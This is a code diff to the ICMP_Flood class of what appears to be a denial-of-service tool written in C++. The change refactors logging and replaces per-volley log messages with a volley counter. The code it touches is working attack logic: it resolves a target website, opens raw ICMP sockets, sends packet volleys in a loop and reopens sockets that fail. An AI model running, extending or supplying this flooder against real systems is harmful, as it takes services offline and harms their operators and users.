@@ -7,8 +7,9 @@
 
 #include "../Headers/ICMP_Flood.hpp"
 #include "../Headers/Randomizer.hpp"
+#include "../Headers/Logging.hpp"
 
-void ICMP_Flood::attack(const int *id) {
+void ICMP_Flood::attack() {
     int r;
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
@@ -31,7 +32,7 @@ void ICMP_Flood::attack(const int *id) {
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                 if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
-                    conf->logger->Log("Can't resolve the host", Logger::Error);
+                    print_error("Can't resolve the host");
                     exit(EXIT_FAILURE);
                 }
             }else{
@@ -59,15 +60,10 @@ void ICMP_Flood::attack(const int *id) {
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_ICMP);
             }else{
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
+                conf->voly++;
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        conf->voly++;
         pause();
     }
 }
